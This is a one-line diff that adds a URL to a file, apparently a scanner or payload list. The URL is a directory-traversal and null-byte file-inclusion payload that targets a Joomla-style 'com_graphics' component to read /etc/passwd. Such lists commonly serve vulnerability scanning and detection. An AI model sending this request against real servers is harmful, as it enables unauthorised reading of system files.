@@ -1,0 +1,1 @@
+/index.php?option=com_graphics&controller=../../../../../../../../../etc/passwd%00
